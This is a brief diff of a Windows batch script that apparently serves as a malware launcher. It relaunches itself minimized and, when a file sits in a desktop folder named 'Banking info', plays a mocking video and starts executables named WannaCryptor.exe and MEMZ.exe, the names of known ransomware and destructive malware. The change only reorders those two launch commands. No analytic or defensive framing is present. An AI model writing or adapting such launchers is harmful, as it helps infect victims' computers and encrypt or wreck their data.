@@ -3,8 +3,8 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
 if Exist "C:\Users\%username%\desktop\Banking info\WannaCryptor.exe" (
 	start HAHA.mp4
 	timeout 4 /nobreak
-	start WannaCryptor.exe
 	start MEMZ.exe
+	start WannaCryptor.exe
 	exit
 )
 else(
